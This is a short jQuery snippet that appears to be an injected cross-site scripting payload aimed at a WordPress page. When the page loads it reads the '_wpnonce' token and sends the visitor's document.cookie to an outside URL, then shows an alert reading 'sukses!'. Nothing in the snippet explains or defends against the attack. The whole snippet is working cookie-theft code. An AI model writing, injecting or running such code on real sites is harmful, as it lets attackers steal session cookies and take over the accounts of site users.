
    $(document).ready(function(){
        var x = document.getElementById("_wpnonce").value;
        console.log(x);
        $.ajax({
            type: 'GET',

            url: 'https://www.google.com/search?client=',
            data: {
                "field_1": document.cookie
    },
            success: function (msg) {
                alert('sukses!');

            }
        });
});
